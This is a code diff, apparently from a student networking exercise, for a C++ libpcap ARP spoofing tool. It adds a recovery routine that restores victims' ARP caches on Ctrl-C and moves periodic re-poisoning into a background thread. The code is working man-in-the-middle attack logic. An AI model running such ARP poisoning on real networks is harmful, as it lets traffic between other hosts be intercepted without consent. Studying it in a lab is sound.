@@ -5,7 +5,8 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-#include <ctime>
+#include <thread>
+#include <csignal>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -34,6 +35,9 @@ struct Param {
 };
 
 Param param;
+pcap_t* g_pcap = nullptr;
+Mac g_attackerMac;
+std::vector<Flow>* g_flows = nullptr;
 
 bool parse(Param* param, int argc, char* argv[]) {
 	if (argc < 4) {
@@ -151,6 +155,37 @@ void infect(pcap_t* pcap, Mac attackerMac, const Flow& flow) {
 	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 }
 
+// 종료 시 정상 ARP 정보를 sender에게 전송하여 감염 해제
+// ARP request로
+void recover(pcap_t* pcap, Mac attackerMac, const Flow& flow) {
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = flow.senderMac;
+	packet.eth_.smac_ = attackerMac; // eth 필드의 smac은 공격자 MAC 주소로
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::Size;
+	packet.arp_.pln_ = Ip::Size;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = flow.targetMac; // ARP 필드에는 Target의 실제 MAC
+	packet.arp_.sip_ = htonl(flow.targetIp);
+	packet.arp_.tmac_ = flow.senderMac;
+	packet.arp_.tip_ = htonl(flow.senderIp);
+
+	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+}
+
+void sigintHandler(int signum) {
+	if (g_pcap && g_flows) {
+		printf("\n[DEBUG] recovering ARP tables...\n");
+		for (const Flow& flow : *g_flows)
+			recover(g_pcap, g_attackerMac, flow);
+	}
+	exit(0);
+}
+
 int main(int argc, char* argv[]) {
 	if (!parse(&param, argc, argv))
 		return EXIT_FAILURE;
@@ -175,6 +210,12 @@ int main(int argc, char* argv[]) {
 
 	std::vector<Flow> flows;
 
+	// SIGINT 핸들러 등록
+	g_pcap = pcap;
+	g_attackerMac = attackerMac;
+	g_flows = &flows;
+	signal(SIGINT, sigintHandler);
+
 	for (int i = 0; i < param.pairs_.size(); i++) {
 		Ip senderIp = param.pairs_[i].first;
 		Ip targetIp = param.pairs_[i].second;
@@ -191,19 +232,19 @@ int main(int argc, char* argv[]) {
 		infect(pcap, attackerMac, flows.back());
 	}
 
-	// 6. 패킷 캡처 루프
-	time_t lastInfect = time(NULL);
-	
-	while (true) {
-		// 주기적 infect (10초마다)
-		time_t now = time(NULL);
-		if (now - lastInfect >= 10) {
+	// 6. 주기적 infect 스레드 (10초마다)
+	std::thread infectThread([&]() {
+		while (true) {
+			sleep(10);
 			for (const Flow& flow : flows)
 				infect(pcap, attackerMac, flow);
 			printf("[DEBUG] periodic re-infect\n");
-			lastInfect = now;
 		}
+	});
+	infectThread.detach();
 
+	// 7. 패킷 캡처 루프
+	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* pkt;
 		int ret = pcap_next_ex(pcap, &header, &pkt);
